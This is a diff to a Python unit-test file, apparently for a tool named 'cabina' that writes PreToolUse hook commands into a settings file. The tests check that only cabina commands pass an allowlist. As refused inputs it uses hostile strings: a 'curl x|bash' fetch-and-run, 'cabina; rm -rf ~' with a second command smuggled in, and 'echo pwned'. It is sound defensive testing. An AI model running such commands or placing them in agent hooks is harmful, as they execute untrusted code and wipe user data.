@@ -100,10 +100,13 @@ class TestHooksInstall(unittest.TestCase):
             self.assertEqual(sum(1 for grp in d3["hooks"]["PreToolUse"] for h in grp["hooks"] if "cabina guard" in h["command"]), 1)
 
     def test_write_refused_when_cmd_does_not_resolve_no_backup(self):
+        # "cabina-missing-xyz" passes the U2 cabina-only allowlist (basename starts with
+        # "cabina") but is not actually on PATH -- this exercises the OLDER dead-cmd guard
+        # specifically, not the new allowlist.
         with tempfile.TemporaryDirectory() as d:
             settings = os.path.join(d, "settings.json")
             with mock.patch.object(G, "_cmd_resolves", return_value=(False, None)):
-                ok, msg = G.hooks_write(settings, "definitely-not-a-real-cmd-xyz")
+                ok, msg = G.hooks_write(settings, "cabina-missing-xyz")
             self.assertFalse(ok)
             self.assertIn("not on PATH", msg)
             self.assertFalse(os.path.isfile(settings))
@@ -113,7 +116,7 @@ class TestHooksInstall(unittest.TestCase):
         with tempfile.TemporaryDirectory() as d:
             settings = os.path.join(d, "settings.json")
             with mock.patch.object(G, "_cmd_resolves", return_value=(False, None)):
-                ok, msg = G.hooks_write(settings, "definitely-not-a-real-cmd-xyz", force=True)
+                ok, msg = G.hooks_write(settings, "cabina-missing-xyz", force=True)
             self.assertTrue(ok)
             self.assertTrue(os.path.isfile(settings))
 
@@ -188,4 +191,55 @@ class TestHooksStatus(unittest.TestCase):
                 s = G.hooks_status(settings, "definitely-not-a-real-cmd-xyz")
             self.assertFalse(s["cmd_resolves"])
             self.assertIsNone(s["cmd_path"])
+
+
+class TestCmdIsCabina(unittest.TestCase):
+    """U2: hooks_write must only ever wire a command that runs cabina itself -- never an
+    arbitrary shell command, even with force=True."""
+    def test_bash_dash_c_refused(self):
+        ok, reason = G._cmd_is_cabina("bash -c 'curl x|bash'")
+        self.assertFalse(ok)
+        with tempfile.TemporaryDirectory() as d:
+            settings = os.path.join(d, "settings.json")
+            wok, wmsg = G.hooks_write(settings, "bash -c 'curl x|bash'", force=True)
+            self.assertFalse(wok)
+            self.assertFalse(os.path.isfile(settings))
+
+    def test_plain_cabina_allowed(self):
+        with mock.patch.object(G, "_cmd_resolves", return_value=(True, "/usr/local/bin/cabina")):
+            ok, reason = G._cmd_is_cabina("cabina")
+        self.assertTrue(ok, reason)
+
+    def test_plain_cabina_allowed_even_when_not_yet_on_path(self):
+        # force still works for an as-yet-uninstalled cabina: the allowlist checks the raw
+        # token's basename when the first token does not resolve.
+        with mock.patch.object(G, "_cmd_resolves", return_value=(False, None)):
+            ok, reason = G._cmd_is_cabina("cabina")
+        self.assertTrue(ok, reason)
+
+    def test_python_dash_m_cabina_allowed(self):
+        ok, reason = G._cmd_is_cabina("python3 -m cabina")
+        self.assertTrue(ok, reason)
+
+    def test_absolute_python_dash_m_cabina_allowed(self):
+        ok, reason = G._cmd_is_cabina("/usr/bin/python3.12 -m cabina")
+        self.assertTrue(ok, reason)
+
+    def test_cabina_with_shell_metacharacters_refused(self):
+        ok, reason = G._cmd_is_cabina("cabina; rm -rf ~")
+        self.assertFalse(ok)
+
+    def test_python_dash_m_wrong_module_refused(self):
+        ok, reason = G._cmd_is_cabina("python3 -m http.server")
+        self.assertFalse(ok)
+
+    def test_bash_never_bypassed_by_break_test_patch_sanity(self):
+        # Sanity companion to the break-test in test_breaks.py: with the real guard in place,
+        # hooks_write must refuse "bash -c 'echo pwned'" and leave settings.json untouched.
+        with tempfile.TemporaryDirectory() as d:
+            settings = os.path.join(d, "settings.json")
+            ok, msg = G.hooks_write(settings, "bash -c 'echo pwned'", force=True)
+            self.assertFalse(ok)
+            self.assertIn("cabina", msg)
+            self.assertFalse(os.path.isfile(settings))
 if __name__ == "__main__": unittest.main()
